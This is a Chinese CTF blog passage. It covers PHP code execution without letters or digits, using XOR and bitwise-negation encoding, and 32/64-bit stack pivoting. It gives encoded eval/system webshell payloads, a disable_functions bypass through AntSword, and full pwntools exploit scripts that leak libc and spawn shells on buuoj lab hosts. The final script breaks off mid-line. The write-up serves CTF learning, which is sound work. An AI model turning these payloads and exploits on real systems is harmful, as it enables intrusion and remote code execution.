<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">finds</span>(<span class="params"><span class="variable">$string</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$lst</span> = [<span class="string">&#x27;码&#x27;</span>,<span class="string">&#x27;析&#x27;</span>,<span class="string">&#x27;均&#x27;</span>,<span class="string">&#x27;真&#x27;</span>,<span class="string">&#x27;雨&#x27;</span>,<span class="string">&#x27;随&#x27;</span>,<span class="string">&#x27;白&#x27;</span>,<span class="string">&#x27;明&#x27;</span>,<span class="string">&#x27;时&#x27;</span>,<span class="string">&#x27;新&#x27;</span>,<span class="string">&#x27;效&#x27;</span>,<span class="string">&#x27;政&#x27;</span>,<span class="string">&#x27;品&#x27;</span>,<span class="string">&#x27;和&#x27;</span>,<span class="string">&#x27;周&#x27;</span>,<span class="string">&#x27;向&#x27;</span>,<span class="string">&#x27;可&#x27;</span>,<span class="string">&#x27;现&#x27;</span>,<span class="string">&#x27;南&#x27;</span>,<span class="string">&#x27;北&#x27;</span>,<span class="string">&#x27;苏&#x27;</span>,<span class="string">&#x27;节&#x27;</span>,<span class="string">&#x27;前&#x27;</span>,<span class="string">&#x27;我&#x27;</span>,<span class="string">&#x27;出&#x27;</span>,<span class="string">&#x27;况&#x27;</span>,<span class="string">&#x27;关&#x27;</span>,<span class="string">&#x27;侯&#x27;</span>,<span class="string">&#x27;彤&#x27;</span>,<span class="string">&#x27;开&#x27;</span>,<span class="string">&#x27;以&#x27;</span>,<span class="string">&#x27;事&#x27;</span>,<span class="string">&#x27;年&#x27;</span>,<span class="string">&#x27;中&#x27;</span>,<span class="string">&#x27;工&#x27;</span>,<span class="string">&#x27;越&#x27;</span>,<span class="string">&#x27;资&#x27;</span>,<span class="string">&#x27;质&#x27;</span>,<span class="string">&#x27;法&#x27;</span>,<span class="string">&#x27;粉&#x27;</span>,<span class="string">&#x27;展&#x27;</span>,<span class="string">&#x27;就&#x27;</span>,<span class="string">&#x27;对&#x27;</span>,<span class="string">&#x27;家&#x27;</span>,<span class="string">&#x27;学&#x27;</span>,<span class="string">&#x27;欢&#x27;</span>,<span class="string">&#x27;高&#x27;</span>,<span class="string">&#x27;验&#x27;</span>,<span class="string">&#x27;空&#x27;</span>,<span class="string">&#x27;程&#x27;</span>,<span class="string">&#x27;规&#x27;</span>,<span class="string">&#x27;离&#x27;</span>,<span class="string">&#x27;神&#x27;</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;<span class="title function_ invoke__">count</span>(<span class="variable">$lst</span>);<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$string</span>[<span class="variable">$i</span>]==~<span class="variable">$lst</span>[<span class="variable">$j</span>][<span class="number">1</span>])&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="variable">$string</span>[<span class="variable">$i</span>].<span class="string">&#x27;:&#x27;</span>.<span class="variable">$lst</span>[<span class="variable">$j</span>].<span class="string">&quot;   &quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">finds</span>(<span class="string">&quot;phpinfo&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="SUCTF-2019-EasyWeb"><a href="#SUCTF-2019-EasyWeb" class="headerlink" title="[SUCTF 2019]EasyWeb"></a><code>[SUCTF 2019]EasyWeb</code></h3><p><a href="https://buuoj.cn/challenges#[SUCTF%202019]EasyWeb">SUCTF 2019EasyWeb</a></p>
<p>要绕过如下过滤：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060223347.png" alt="image-20250119103540779" style="zoom:50%;" />

<p>已知<code>_,G,E,T</code>字符可以如下构成</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">_:<span class="variable">%86</span>^<span class="variable">%d9</span></span><br><span class="line">G:<span class="variable">%86</span>^<span class="variable">%c1</span></span><br><span class="line">E:<span class="variable">%86</span>^<span class="variable">%c3</span></span><br><span class="line">T:<span class="variable">%86</span>^<span class="variable">%d2</span></span><br></pre></td></tr></table></figure>

<p>构造执行<code>phpinfo()</code>的payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[code]);</span><br><span class="line"><span class="comment"># ?code=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo</span></span><br></pre></td></tr></table></figure>

<h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a><code>[极客大挑战 2019]RCE ME</code></h3><p>源码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="comment">#限制</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>) <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>)) <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>过滤了大小写字母和数字</p>
<p>先通过phpinfo()测试一下</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line"># phpinfo  %8F%97%8F%96%91%99%90</span><br><span class="line"># phpinfo();  (!phpinfo)();</span><br><span class="line">?code = (~%8F%97%8F%96%91%99%90)();</span><br><span class="line">#(assert)((<span class="keyword">eval</span>($_POST[shell])));</span><br><span class="line">?code = (~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6%D6);</span><br></pre></td></tr></table></figure>

<p><code>%8F%97%8F%96%91%99%90</code>是什么呢？是由字符串<code>phpinfo</code>先取反再进行<code>url</code>编码所得到的一串编码。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="variable">$p</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;assert&#x27;</span>).<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(~<span class="string">&#x27;(eval($_POST[shell]))&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment"># %8F%97%8F%96%91%99%90</span></span><br><span class="line">    <span class="comment">#%9E%8C%8C%9A%8D%8B</span></span><br><span class="line">	<span class="comment">#%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6%D6</span></span><br></pre></td></tr></table></figure>

<p><strong>解题：</strong></p>
<p>传入参数<code>?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6%D6);</code></p>
<p>蚁剑连接<code>http://81ee6069-0856-4349-b89f-342253bbe6eb.node5.buuoj.cn:81/?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%8C%97%9A%93%93%A2%D6%D6);</code></p>
<h4 id="绕过diasble-functions"><a href="#绕过diasble-functions" class="headerlink" title="绕过diasble_functions"></a>绕过<code>diasble_functions</code></h4><p>然后选择绕过<code>diasble_functions</code>插件</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060223549.png" alt="image-20241103225407335" style="zoom:50%;" />

<p>选择模式，<code>PHP7_GC_UAF</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060224964.png" alt="image-20241103225445065" style="zoom:50%;" />

<p>在命令行界面中执行<code>/readflag</code>，得到<code>flag</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060224985.png" alt="image-20241103225639279" style="zoom:67%;" />

<h3 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a><code>[SUCTF 2018]GetShell</code></h3><p><a href="https://buuoj.cn/challenges#[SUCTF%202018]GetShell">SUCTF 2018 GetShell</a></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060223534.png" alt="image-20250120154828228" style="zoom: 50%;" />

<p>上传一个文件，会对文件中从第五个字符及以后依次检查，该过滤的都过滤完了，就只剩下<code>$ ~ [] _ () ; .</code>这些字符没有被过滤，这里利用一种汉字取反的方法。</p>
<p>构造<code>system($_POST[_]);</code>，并上传</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_</span>=[]==[];</span><br><span class="line"><span class="variable">$__</span>=~北[<span class="variable">$_</span>].~冲[<span class="variable">$_</span>].~北[<span class="variable">$_</span>].~苏[<span class="variable">$_</span>].~皇[<span class="variable">$_</span>].~和[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$___</span>=~码[<span class="variable">$_</span>].~寸[<span class="variable">$_</span>].~小[<span class="variable">$_</span>].~欠[<span class="variable">$_</span>].~立[<span class="variable">$_</span>];</span><br><span class="line"><span class="variable">$__</span>(<span class="variable">$$___</span>[_]);</span><br></pre></td></tr></table></figure>

<p><code>buu</code>环境原因，只能在环境变量中查看flag，<code>system(&#39;env&#39;)</code>查看系统中的环境变量。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202502060224304.png" alt="image-20250120155728131"></p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://arsenetang.github.io/2021/07/28/RCE%E7%AF%87%E4%B9%8B%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97rce/#2-%E5%8F%96%E5%8F%8D">RCE篇之无数字字母rce</a></p>
<p><a href="https://blog.csdn.net/qq_61778128/article/details/127063407">无数字字母rce总结（取反、异或、自增、临时文件）-CSDN博客</a></p>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>栈迁移</title>
    <url>/2024/03/20/%E6%A0%88%E8%BF%81%E7%A7%BB%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="为什么要栈迁移？"><a href="#为什么要栈迁移？" class="headerlink" title="为什么要栈迁移？"></a>为什么要栈迁移？</h2><p>​	我的理解是由于输入字节的限制，我们没有办法在覆盖返回地址后继续写入我们构造的后门代码让程序执行。那现在怎么办呢，幸好我们有<code>leave ; ret</code>这两个指令（<code>leave</code>指令相当于<code>mov esp,ebp ; pop ebp</code>这两条指令，而执行<code>ret</code>指令就是<code>pop eip</code>，<code>eip</code>是一个指令指针，装的是下一条指令的地址），执行两次<code>leave ; ret</code>指令可以控制程序的执行流到<code>ebp</code>指向内存单元，即我们构造的用于拿到<code>shell</code>的代码地址。</p>
<span id="more"></span>

<p>​	这两张图是两次执行<code>leave ; ret</code>指令的过程，我觉得师父已经解释得很详细了。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251951713.png" alt="img"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251950031.png" alt="img"></p>
<h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="ciscn-2019-es-2（栈上）"><a href="#ciscn-2019-es-2（栈上）" class="headerlink" title="ciscn_2019_es_2（栈上）"></a><code>ciscn_2019_es_2</code>（栈上）</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>​	先泄漏一个地址，由于<code>printf</code>遇见<code>\x00</code>截断，那么我们恰好填充<code>0x28</code>个字节，就会把<code>ebp</code>指向的地址泄漏出来。构造第一个<code>payload = b&#39;a&#39;*0x20+b&#39;b&#39;*0x8</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name?\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#注意这里不能用sendline，因为我们需要恰好填充0x28个字节，sendline会多一个字节\n(换行符)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br></pre></td></tr></table></figure>

<p>这张图大概就是我们要布置的<code>payload</code>内容	<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251950815.png" alt="image-20240124160536927" style="zoom: 67%;" /></p>
<p>​	算出<code>ebp</code>中的内容（因为泄漏出来的地址并不是<code>ebp</code>的地址，而是<code>ebp</code>指向的地址，即<code>ebp</code>中的内容）距离参数<code>s</code>的偏移量，<code>gdb</code>调试。下断点，下在<code>vul</code>函数，一直<code>n</code>到<code>read</code>函数，输入<code>aaaa</code>正好<code>4</code>个字节，便于查看</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251950249.png" alt="image-20240124150654746" style="zoom: 67%;" />

<p>​	<code>0xffffd044</code>指向<code>0xffffd050</code>，我们写入的<code>aaaa</code>被放到了<code>0xffffd050</code>这个地址上，而<code>ebp</code>中放的是<code>0xffffd088</code>这个地址，<code>0xffffd088 - 0xffffd050 = 0x38</code>，因此<code>ebp</code>距离我们写入到<code>s</code>的位置的偏移量为<code>0x38</code>。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251949627.png" alt="image-20240124150842035"></p>
<p>​	程序中<code>system</code>函数的参数不是我们想要的，因此需要我们自己写入<code>/bin/sh</code>，那么问题又来了，我们怎么知道我们写入的<code>/bin/sh</code>被放到了哪个地址上？我们可以计算出这个地址到<code>ebp</code>的偏移量，然后就可以用我们泄漏出来的地址和偏移量去表示这个地址。那怎么计算偏移量呢？我们先构造一个<code>payload = b&#39;aaaa&#39;+p32(system_plt)+p32(0)+p32(0)+b&#39;/bin/sh&#39;</code>，第二个<code>p32(0)</code>的位置应该是<code>/bin/sh</code>的地址，但是我们现在还不知道所以先随便用<code>4</code>个字节替代。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret_addr = <span class="number">0x08048562</span></span><br><span class="line">payload = (<span class="string">b&#x27;aaaa&#x27;</span>+p32(system_plt)+p32(<span class="number">0</span>)+p32(binsh_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#先写入aaaa,到时候pop ebp就是把aaaa弹出了</span></span><br><span class="line">payload += p32(stack_addr)  </span><br><span class="line"><span class="comment">#这个地址是栈顶的地址，也就是我们payload中aaaa的地址，要用这个地址去覆盖ebp</span></span><br><span class="line">payload += p32(leave_ret_addr)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure>

<p>​	<code>gdb</code>调试，先两次<code>finish</code>跳出两个函数，现在我们来到<code>vul</code>函数中，一直<code>n</code>经过两个<code>read</code>函数，<code>stack 20</code>查看栈上的内容。这里的<code>0xff911f80</code>就是存放<code>/bin/sh</code>的起始地址，<code>0xff911fa8</code>就是<code>ebp</code>指向的地址，即我们泄漏出来的地址，计算偏移量为<code>0xff911fa8 - 0xff911f80 = 0x28</code>，我们用可以<code>ebp - 0x28</code>表示<code>/bin/sh</code>的地址。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251950391.png" alt="image-20240124155144311" style="zoom:67%;" />

<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27242</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./es2&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./es2&#x27;</span>)</span><br><span class="line">debug(p)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name?\n&#x27;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;bbbbbbbb&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#print(hex(ebp))</span></span><br><span class="line"></span><br><span class="line">binsh_addr = ebp-<span class="number">0x28</span></span><br><span class="line">stack_addr = ebp-<span class="number">0x38</span></span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">leave_ret_addr = <span class="number">0x08048562</span></span><br><span class="line">payload = (<span class="string">b&#x27;aaaa&#x27;</span>+p32(system_plt)+p32(<span class="number">0</span>)+p32(binsh_addr)+<span class="string">b&#x27;/bin/sh&#x27;</span>).ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"><span class="comment">#先写入aaaa,到时候pop ebp就是把aaaa弹出了</span></span><br><span class="line">payload += p32(stack_addr)  </span><br><span class="line"><span class="comment">#这个地址是栈顶的地址，也就是我们payload中aaaa的地址，要用这个地址去覆盖ebp</span></span><br><span class="line">payload += p32(leave_ret_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251950074.png" alt="image-20240124190933737"></p>
<h2 id="Black-Watch-入群题-PWN（-bss段）"><a href="#Black-Watch-入群题-PWN（-bss段）" class="headerlink" title="[Black Watch 入群题]PWN（.bss段）"></a><code>[Black Watch 入群题]PWN</code>（<code>.bss</code>段）</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>​	程序中没有<code>system</code>函数和<code>/bin/sh</code>字符串，有<code>write</code>函数，需要我们字节泄漏<code>libc</code>地址。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251949639.png" alt="image-20240125121010913"></p>
<p>​	看第二次<code>read</code>，可以读入<code>0x20(32)</code>个字节，覆盖<code>buf</code>需要<code>0x18(24)</code>个字节，覆盖<code>ebp</code>需要<code>0x4(4)</code>个字节，覆盖返回地址需要<code>0x4(4)</code>个字节，<code>0x20(32)</code>个字节刚好够用，只能栈迁移了。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251950833.png" alt="image-20240125121711314"></p>
<p>​	现在大致思路就是第一次<code>read</code>把我们构造的泄漏<code>libc</code>代码写到<code>.bss</code>段，其中返回地址为<code>main</code>函数的地址也就是让我们程序再走一遍。第二次<code>read</code>覆盖<code>ebp</code>为<code>.bss</code>段的地址，覆盖返回地址为<code>leave ; ret</code>指令的地址。程序跑第二次的时候把我们构造的拿<code>shell</code>的代码写到<code>.bss</code>段，第二次<code>read</code>同上。</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./spwn&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">27419</span>)</span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./spwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr = elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?&#x27;</span>)</span><br><span class="line">s_addr = <span class="number">0x0804A300</span></span><br><span class="line">leave_ret_addr = <span class="number">0x08048511</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(s_addr)+p32(leave_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">write_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#print(hex(write_addr))</span></span><br><span class="line">base_addr = write_addr-libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">system_addr = base_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_addr = base_addr+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span>+p32(system_addr)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;name?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;say?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+p32(s_addr)+p32(leave_ret_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>拿到<code>flag</code></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251950755.png" alt="image-20240125130841168"></p>
<h2 id="gyctf-2020-borrowstack"><a href="#gyctf-2020-borrowstack" class="headerlink" title="gyctf_2020_borrowstack"></a><code>gyctf_2020_borrowstack</code></h2><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>查看保护，只开了<code>NX</code>保护</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251950796.png" alt="image-20240206202551148"></p>
<p>​	分析函数，两次<code>read</code>第二次是写到<code>.bss</code>段。第一个<code>read</code>可以读入<code>0x70(112)</code>个字节，只能溢出<code>16</code>个字节，恰好可以覆盖返回地址。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">96</span>]; <span class="comment">// [rsp+0h] [rbp-60h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x70u</span>LL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Done!You can check and use your borrow stack now!&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;bank, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	先泄漏<code>libc</code>，我们要用到栈迁移。第一次<code>read</code>我们先填充<code>0x60</code>个字节的垃圾数据，然后<code>ebp</code>中写入<code>.bss</code>段的地址（因为我们会把泄漏<code>libc</code>的<code>payload</code>写到<code>.bss</code>段），然后覆盖返回地址为<code>leave ; ret</code>的地址。</p>
<p>​	这里有一点需要注意的就是，在写入泄漏地址的代码前要先用<code>ret</code>指令抬高栈帧（调用<code>puts</code>函数会开辟新的栈帧，会毁坏<code>.bss</code>段上面（低地址）的<code>got</code>表等数据）。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;want&#x27;</span>)</span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">leave_ret = <span class="number">0x400699</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(bss_addr)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;now!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line">payload = p64(ret)*<span class="number">20</span>  <span class="comment">#至少需要20个ret</span></span><br><span class="line">payload += p64(<span class="number">0x400703</span>)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;puts_addr --&gt;&#x27;</span>,<span class="built_in">hex</span>(puts_addr))</span><br></pre></td></tr></table></figure>

<p>​	然后我本来是想拿到<code>system(&quot;/bin/sh&quot;)</code>的地址后，再一次栈溢出，同上。但是一直打不通，后来看<code>wp</code>都是用<code>one_gadget</code>做的。</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202503251949275.png" alt="image-20240206213713266"></p>
<p>​	直接在第一次<code>read</code>时栈溢出，覆盖返回地址为<code>one_gadget</code>的地址即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">base_addr = puts_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">shell_addr = base_addr+<span class="number">0x4526a</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x60</span>+<span class="number">8</span>)+p64(shell_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>​	因为我们覆盖的是<code>main</code>函数的返回地址，所以还需要再发送一些数据让执行流执行完第二个<code>read</code>函数，然后才能执行完<code>mian</code>函数，跳到我们覆盖的返回地址去执行后门函数。</p>
<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a><code>exp</code></h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from tools import *</span></span><br><span class="line">p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27820</span>)</span><br><span class="line"><span class="comment">#p = process(&#x27;./gyctf&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./gyctf&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">context.arch =<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#debug(p)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;want&#x27;</span>)</span><br><span class="line">bss_addr = <span class="number">0x601080</span></span><br><span class="line">leave_ret = <span class="number">0x400699</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x60</span>+p64(bss_addr)+p64(leave_ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;now!&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x4004c9</span></span><br><span class="line">payload = p64(ret)*<span class="number">20</span>  </span><br><span class="line">payload += p64(<span class="number">0x400703</span>)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvline()</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span 